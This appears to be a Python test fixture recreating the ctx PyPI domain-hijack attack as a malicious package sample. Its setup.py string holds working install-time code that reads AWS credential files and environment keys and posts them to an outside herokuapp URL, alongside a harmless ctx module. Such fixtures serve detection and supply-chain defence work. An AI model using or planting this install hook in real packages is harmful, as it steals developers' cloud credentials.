"""
Simulated ctx (PyPI domain expiry hijack) attack patterns.
Real attack: maintainer's email domain expired, attacker registered it,
reset PyPI password, uploaded malicious version that stole AWS credentials.
"""

SETUP_PY = """
from setuptools import setup
import os
import json
import urllib.request

def _exfil():
    creds = {}
    # Steal AWS credentials
    aws_creds = os.path.expanduser('~/.aws/credentials')
    if os.path.exists(aws_creds):
        with open(aws_creds) as f:
            creds['aws'] = f.read()

    # Steal environment variables
    for key in ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN']:
        val = os.environ.get(key)
        if val:
            creds[key] = val

    if creds:
        payload = json.dumps(creds).encode()
        req = urllib.request.Request(
            'https://anti-theft-web.herokuapp.com/hacked',
            data=payload,
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req)

_exfil()

setup(
    name="ctx",
    version="0.2.6",
    py_modules=["ctx"],
)
"""

CTX_MODULE = """
# Original ctx functionality (dict subclass)
class ctx(dict):
    def __getattr__(self, name):
        try:
            return self[name]
        except KeyError:
            raise AttributeError(name)
    def __setattr__(self, name, value):
        self[name] = value
"""

PACKAGE_FILES = {
    "ctx-0.2.6/setup.py": SETUP_PY,
    "ctx-0.2.6/ctx.py": CTX_MODULE,
}
